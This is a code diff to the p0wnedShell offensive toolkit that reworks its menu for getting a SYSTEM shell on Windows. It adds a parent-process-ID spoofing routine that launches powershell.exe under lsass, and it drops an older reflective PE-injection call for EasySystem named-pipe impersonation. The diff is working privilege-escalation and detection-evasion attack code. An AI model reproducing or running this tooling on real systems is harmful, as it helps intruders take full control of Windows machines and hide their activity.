@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Security.Principal;
 
 namespace p0wnedShell
 {
@@ -17,22 +18,12 @@ namespace p0wnedShell
             PowerBanner();
             Console.WriteLine(" 1. Get a SYSTEM shell using EasySystem (NamedPipe Impersonation).");
             Console.WriteLine();
-            Console.WriteLine(" 2. Get a SYSTEM shell using Token Manipulation.");
+            Console.WriteLine(" 2. Get a SYSTEM shell using CreateProcess PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute.");
             Console.WriteLine();
-            Console.WriteLine(" 3. Back.");
+            Console.WriteLine(" 3. Get a SYSTEM shell using Token Manipulation.");
+            Console.WriteLine();
+            Console.WriteLine(" 4. Back.");
             Console.Write("\nEnter choice: ");
-
-            string osArch = "x86";
-            if (Pshell.EnvironmentHelper.Is64BitOperatingSystem())
-            {
-                osArch = "x64";
-            }
-
-            string procArch = "x86";
-            if (Pshell.EnvironmentHelper.Is64BitProcess())
-            {
-                procArch = "x64";
-            }
 
             int userInput = 0;
             while (true)
@@ -40,7 +31,7 @@ namespace p0wnedShell
                 try
                 {
                     userInput = Convert.ToInt32(Console.ReadLine());
-                    if (userInput < 1 || userInput > 3)
+                    if (userInput < 1 || userInput > 4)
                     {
                         Console.ForegroundColor = ConsoleColor.Red;
                         Console.WriteLine("\n[+] Wrong choice, please try again!\n");
@@ -64,16 +55,7 @@ namespace p0wnedShell
             switch (userInput)
             {
                 case 1:
-                    if (procArch != osArch)
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("\n[+] Your OS Architectecture does not match the version of p0wnedShell you run.");
-                        Console.WriteLine("[+] To run EasySystem, you should run the " + osArch + " version of p0wnedShell\n");
-                        Console.ResetColor();
-                        Console.WriteLine("Press Enter to Continue...");
-                        Console.ReadLine();
-                    }
-                    else if (!Program.IsElevated)
+                    if (!Program.IsElevated)
                     {
                         Console.ForegroundColor = ConsoleColor.Red;
                         Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
@@ -83,10 +65,24 @@ namespace p0wnedShell
                     }
                     else
                     {
-                        SystemShell(osArch);
+                        SystemShell();
                     }
                     break;
                 case 2:
+                    if (!Program.IsElevated)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
+                        Console.ResetColor();
+                        Console.WriteLine("Press Enter to Continue...");
+                        Console.ReadLine();
+                    }
+                    else
+                    {
+                        EasySystemPPID();
+                    }
+                    break;
+                case 3:
                     if (!Program.IsElevated)
                     {
                         Console.ForegroundColor = ConsoleColor.Red;
@@ -105,24 +101,47 @@ namespace p0wnedShell
             }
         }
 
-        public static void SystemShell(string osArch)
+        public static void SystemShell()
         {
             string[] toPrint = { "* Get a SYSTEM shell using EasySystem (NamedPipe Impersonation)     *" };
             Program.PrintBanner(toPrint);
 
-            Console.WriteLine("[+] Please wait for our SYSTEM PowerShell to Popup...\n");
-            string SystemShell = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.Easy_System(osArch) + "\" -split ' ') -ForceASLR";
-            try
-            {
-                P0wnedListener.Execute(SystemShell);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
+            EasySystem.EasySystemShell();
 
             Console.WriteLine("[+] Press Enter to Continue...");
             Console.ReadLine();
+
+            return;
+        }
+
+        public static void EasySystemPPID()
+        {
+            if (!WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("\n[!] For this function to succeed, you need UAC Elevated Administrator privileges.");
+                Console.ResetColor();
+                return;
+            }
+
+            string szCommandLine = "powershell.exe";
+
+            string PPIDName = "lsass";
+            int NewPPID = 0;
+
+            // Find PID from our new Parent and start new Process with new Parent ID
+            NewPPID = ProcessCreator.NewParentPID(PPIDName);
+            if (NewPPID == 0)
+            {
+                Console.WriteLine("\n[!] No suitable Process ID Found...");
+                return;
+            }
+
+            if (!ProcessCreator.CreateProcess(NewPPID, null, szCommandLine))
+            {
+                Console.WriteLine("\n[!] Oops PPID Spoof failed...");
+                return;
+            }
 
             return;
         }
